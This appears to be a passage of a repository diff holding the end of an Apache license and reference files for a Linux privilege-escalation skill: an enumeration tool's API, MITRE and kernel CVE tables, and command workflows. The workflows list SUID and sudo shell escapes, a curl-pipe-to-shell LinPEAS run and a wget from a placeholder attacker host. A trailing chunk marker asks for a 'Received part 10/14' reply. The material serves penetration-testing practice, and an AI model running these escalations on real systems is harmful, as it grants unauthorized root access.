+      use, offer to sell, sell, import, and otherwise transfer the Work,
+      where such license applies only to those patent claims licensable
+      by such Contributor that are necessarily infringed by their
+      Contribution(s) alone or by combination of their Contribution(s)
+      with the Work to which such Contribution(s) was submitted. If You
+      institute patent litigation against any entity (including a
+      cross-claim or counterclaim in a lawsuit) alleging that the Work
+      or a Contribution incorporated within the Work constitutes direct
+      or contributory patent infringement, then any patent licenses
+      granted to You under this License for that Work shall terminate
+      as of the date such litigation is filed.
+
+   4. Redistribution. You may reproduce and distribute copies of the
+      Work or Derivative Works thereof in any medium, with or without
+      modifications, and in Source or Object form, provided that You
+      meet the following conditions:
+
+      (a) You must give any other recipients of the Work or
+          Derivative Works a copy of this License; and
+
+      (b) You must cause any modified files to carry prominent notices
+          stating that You changed the files; and
+
+      (c) You must retain, in the Source form of any Derivative Works
+          that You distribute, all copyright, patent, trademark, and
+          attribution notices from the Source form of the Work,
+          excluding those notices that do not pertain to any part of
+          the Derivative Works; and
+
+      (d) If the Work includes a "NOTICE" text file as part of its
+          distribution, then any Derivative Works that You distribute must
+          include a readable copy of the attribution notices contained
+          within such NOTICE file, excluding any notices that do not
+          pertain to any part of the Derivative Works, in at least one
+          of the following places: within a NOTICE text file distributed
+          as part of the Derivative Works; within the Source form or
+          documentation, if provided along with the Derivative Works; or,
+          within a display generated by the Derivative Works, if and
+          wherever such third-party notices normally appear. The contents
+          of the NOTICE file are for informational purposes only and
+          do not modify the License. You may add Your own attribution
+          notices within Derivative Works that You distribute, alongside
+          or as an addendum to the NOTICE text from the Work, provided
+          that such additional attribution notices cannot be construed
+          as modifying the License.
+
+      You may add Your own copyright statement to Your modifications and
+      may provide additional or different license terms and conditions
+      for use, reproduction, or distribution of Your modifications, or
+      for any such Derivative Works as a whole, provided Your use,
+      reproduction, and distribution of the Work otherwise complies with
+      the conditions stated in this License.
+
+   5. Submission of Contributions. Unless You explicitly state otherwise,
+      any Contribution intentionally submitted for inclusion in the Work
+      by You to the Licensor shall be under the terms and conditions of
+      this License, without any additional terms or conditions.
+      Notwithstanding the above, nothing herein shall supersede or modify
+      the terms of any separate license agreement you may have executed
+      with Licensor regarding such Contributions.
+
+   6. Trademarks. This License does not grant permission to use the trade
+      names, trademarks, service marks, or product names of the Licensor,
+      except as required for reasonable and customary use in describing the
+      origin of the Work and reproducing the content of the NOTICE file.
+
+   7. Disclaimer of Warranty. Unless required by applicable law or
+      agreed to in writing, Licensor provides the Work (and each
+      Contributor provides its Contributions) on an "AS IS" BASIS,
+      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
+      implied, including, without limitation, any warranties or conditions
+      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
+      PARTICULAR PURPOSE. You are solely responsible for determining the
+      appropriateness of using or redistributing the Work and assume any
+      risks associated with Your exercise of permissions under this License.
+
+   8. Limitation of Liability. In no event and under no legal theory,
+      whether in tort (including negligence), contract, or otherwise,
+      unless required by applicable law (such as deliberate and grossly
+      negligent acts) or agreed to in writing, shall any Contributor be
+      liable to You for damages, including any direct, indirect, special,
+      incidental, or consequential damages of any character arising as a
+      result of this License or out of the use or inability to use the
+      Work (including but not limited to damages for loss of goodwill,
+      work stoppage, computer failure or malfunction, or any and all
+      other commercial damages or losses), even if such Contributor
+      has been advised of the possibility of such damages.
+
+   9. Accepting Warranty or Additional Liability. While redistributing
+      the Work or Derivative Works thereof, You may choose to offer,
+      and charge a fee for, acceptance of support, warranty, indemnity,
+      or other liability obligations and/or rights consistent with this
+      License. However, in accepting such obligations, You may act only
+      on Your own behalf and on Your sole responsibility, not on behalf
+      of any other Contributor, and only if You agree to indemnify,
+      defend, and hold each Contributor harmless for any liability
+      incurred by, or claims asserted against, such Contributor by reason
+      of your accepting any such warranty or additional liability.
+
+   END OF TERMS AND CONDITIONS
+
+   APPENDIX: How to apply the Apache License to your work.
+
+      To apply the Apache License to your work, attach the following
+      boilerplate notice, with the fields enclosed by brackets "[]"
+      replaced with your own identifying information. (Don't include
+      the brackets!)  The text should be enclosed in the appropriate
+      comment syntax for the file format. Please do not remove or change
+      the license header comment from a contributed file except when
+      necessary.
+
+   Copyright 2026 mukul975
+
+   Licensed under the Apache License, Version 2.0 (the "License");
+   you may not use this file except in compliance with the License.
+   You may obtain a copy of the License at
+
+       http://www.apache.org/licenses/LICENSE-2.0
+
+   Unless required by applicable law or agreed to in writing, software
+   distributed under the License is distributed on an "AS IS" BASIS,
+   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+   See the License for the specific language governing permissions and
+   limitations under the License.
+
+##### END FILE #####
+
+##### FILE: performing-privilege-escalation-on-linux/references/api-reference.md #####
+# API Reference — Performing Privilege Escalation on Linux
+
+## Libraries Used
+- **subprocess**: Execute system enumeration commands (sudo, find, getcap, crontab)
+- **os**: Check file writability with os.access()
+- **pathlib**: File system navigation
+- **re**: Pattern matching for cron script paths
+
+## CLI Interface
+```
+python agent.py sysinfo
+python agent.py sudo
+python agent.py suid
+python agent.py writable
+python agent.py cron
+python agent.py caps
+python agent.py full
+```
+
+## Core Functions
+
+### `enumerate_system_info()` — Kernel, user, architecture info
+### `check_sudo_permissions()` — Sudo privilege analysis
+Checks `sudo -l` output against 30+ GTFOBins-exploitable binaries.
+Detects NOPASSWD entries and full sudo access.
+
+### `find_suid_binaries()` — SUID/SGID binary enumeration
+Identifies binaries with SUID bit set. Cross-references GTFOBins database.
+
+### `check_writable_files()` — Sensitive writable file detection
+Checks: /etc/passwd, /etc/shadow, /etc/sudoers, /etc/crontab, /root, cron dirs.
+
+### `check_cron_jobs()` — Cron job privilege escalation vectors
+Identifies writable scripts called from cron jobs (CRITICAL finding).
+
+### `check_capabilities()` — Linux capability enumeration
+Flags: cap_setuid, cap_setgid, cap_sys_admin, cap_dac_override, cap_net_raw.
+
+### `full_enumeration()` — Combined analysis
+
+## GTFOBins SUID Exploitable Binaries (subset)
+vim, find, bash, python, perl, nmap, env, tar, docker, strace, gdb, pkexec
+
+## Dangerous Sudo Patterns
+| Pattern | Severity | Vector |
+|---------|----------|--------|
+| (ALL) NOPASSWD: /usr/bin/vim | CRITICAL | Shell escape |
+| (ALL : ALL) ALL | CRITICAL | Full root access |
+| NOPASSWD: /usr/bin/find | CRITICAL | -exec escalation |
+
+## Dependencies
+No external packages — Python standard library only.
+System: find, getcap, sudo, crontab
+
+##### END FILE #####
+
+##### FILE: performing-privilege-escalation-on-linux/references/standards.md #####
+# Standards and Framework References
+
+## MITRE ATT&CK - Privilege Escalation (TA0004)
+| Technique ID | Name | Description |
+|-------------|------|-------------|
+| T1548.001 | Setuid and Setgid | Exploit SUID/SGID binaries |
+| T1548.003 | Sudo and Sudo Caching | Abuse sudo misconfigurations |
+| T1068 | Exploitation for Privilege Escalation | Kernel/service exploits |
+| T1574.006 | Dynamic Linker Hijacking | LD_PRELOAD/LD_LIBRARY_PATH abuse |
+| T1053.003 | Cron | Abuse scheduled tasks |
+| T1543.002 | Systemd Service | Writable service manipulation |
+
+## Common Kernel CVEs
+| CVE | Name | Kernel Range | CVSS |
+|-----|------|-------------|------|
+| CVE-2016-5195 | Dirty Cow | < 4.8.3 | 7.8 |
+| CVE-2021-4034 | PwnKit (pkexec) | Polkit < 0.120 | 7.8 |
+| CVE-2022-0847 | Dirty Pipe | 5.8 - 5.16.10 | 7.8 |
+| CVE-2021-3156 | Baron Samedit (sudo) | sudo < 1.9.5p2 | 7.8 |
+| CVE-2023-2640 | GameOver(lay) | Ubuntu kernels | 7.8 |
+| CVE-2023-0386 | OverlayFS | 5.11 - 6.2 | 7.8 |
+
+## CIS Benchmark - Linux
+- Ensure permissions on /etc/crontab are configured (600 root:root)
+- Ensure SUID/SGID files are reviewed regularly
+- Ensure sudo is configured to use a pseudo-TTY
+- Ensure no world-writable files exist in system paths
+
+##### END FILE #####
+
+##### FILE: performing-privilege-escalation-on-linux/references/workflows.md #####
+# Linux Privilege Escalation Workflows
+
+## Workflow 1: Manual Enumeration
+
+### System Information
+```bash
+# OS and kernel version
+uname -a
+cat /etc/os-release
+cat /proc/version
+
+# Check for writable paths
+find / -writable -type d 2>/dev/null
+find / -writable -type f 2>/dev/null
+
+# Network info
+ip a
+ss -tlnp
+netstat -tulpn
+```
+
+### SUID/SGID Binaries
+```bash
+# Find SUID binaries
+find / -perm -4000 -type f 2>/dev/null
+find / -perm -2000 -type f 2>/dev/null
+
+# Cross-reference with GTFOBins
+# https://gtfobins.github.io/
+```
+
+### Sudo Configuration
+```bash
+sudo -l
+# Check for:
+# - (ALL) NOPASSWD: /usr/bin/vim
+# - (ALL) NOPASSWD: /usr/bin/find
+# - (ALL) NOPASSWD: /usr/bin/python3
+# - Wildcard entries: /usr/bin/rsync *
+```
+
+### Cron Jobs
+```bash
+cat /etc/crontab
+ls -la /etc/cron.*
+crontab -l
+# Monitor processes for hidden cron
+# Use pspy to see processes running as root
+```
+
+### Capabilities
+```bash
+getcap -r / 2>/dev/null
+# Interesting capabilities:
+# cap_setuid - python3, perl, ruby
+# cap_dac_override - any binary
+# cap_net_raw - tcpdump
+```
+
+## Workflow 2: Automated Enumeration
+
+### LinPEAS
+```bash
+# Download and run
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+# Or transfer and run
+wget http://attacker/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh -a 2>&1 | tee linpeas_output.txt
+```
+
+### Linux Exploit Suggester
+```bash
+wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
+chmod +x linux-exploit-suggester.sh
+./linux-exploit-suggester.sh
+```
+
+## Workflow 3: Common Exploitation
+
+### SUID Binary Exploitation (GTFOBins)
+```bash
+# /usr/bin/find with SUID
+find . -exec /bin/sh -p \; -quit
+
+# /usr/bin/python3 with SUID
+python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+# /usr/bin/vim with SUID
+vim -c ':!sh'
+
+# /usr/bin/nmap with SUID (old versions)
+nmap --interactive
+!sh
+```
+
+### Sudo Abuse Examples
+```bash
+# sudo vim
+sudo vim -c ':!sh'
+
+# sudo find
+sudo find / -exec /bin/sh \; -quit
+
+# sudo python3
+sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+
+-----
+[END PART 10/14] — رد غير "Received part 10/14"
